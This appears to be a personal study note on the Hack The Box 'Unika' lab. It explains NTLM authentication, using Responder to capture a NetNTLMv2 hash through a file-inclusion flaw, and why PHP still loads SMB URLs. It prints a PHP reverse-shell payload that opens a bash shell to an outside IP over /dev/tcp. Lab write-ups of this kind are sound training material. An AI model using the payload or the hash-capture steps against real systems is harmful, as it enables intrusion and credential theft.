- Unable to view `unika.htb` in browser
- Update `/etc/hosts`

- Before updating the `/etc/hosts` file, your system did not know how to resolve "unika.htb" to an IP address. Although the server told your browser to go to "unika.htb", without a valid DNS entry (in public DNS or via your `/etc/hosts` file), your system couldn't resolve this domain to an IP address, hence the page could not load.
- The domain "unika.htb" suggests a domain used for internal or development purposes, which wouldn't be resolvable through public DNS servers. It's typical in development and testing environments to use `.htb` (hack the box) or similar top-level domains not recognized by public DNS.

**Walkthrough**

"This lab focuses on how a File Inclusion vulnerability on a webpage being served on a Windows machine can be exploited to collect the NetNTLMv2 challenge of the user that is running the web server"

**NTLM**

![[Visuals.canvas]]
The NTLM authentication process is done in the following way : 
1. The client sends the user name and domain name to the server. 
2. The server generates a random character string, referred to as the challenge. 
3. The client encrypts the challenge with the NTLM hash of the user password and sends it back to the server. 
4. The server retrieves the user password (or equivalent). 
5. The server uses the hash value retrieved from the security account database to encrypt the challenge string. The value is then compared to the value received from the client. If the values match, the client is authenticated.
***

#### **Responder**
#tools 

Python tool capable of performing many attacks but will focus on serving a malicious SMB share for the web-server to authenticate to

When the target machine attempts to perform the NTLM authentication to that server, Responder sends a challenge back for the server to encrypt with the user's password. When the server responds, Responder will use the challenge and the encrypted response to generate the NetNTLMv2.

We will then attempt to crack the hash



- Initially I tried to serve the machine a malicious php reverse shell via python but received an error

```
<?php 
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.71/5555 0>&1'");
?>
```

In the PHP configuration file php.ini , "allow_url_include" wrapper is set to "Off" by default, indicating that PHP does not load remote HTTP or FTP URLs to prevent remote file inclusion attacks. However, even if allow_url_include and allow_url_fopen are set to "Off", PHP will not prevent the loading of SMB URLs. In our case, we can misuse this functionality to steal the NTLM hash.
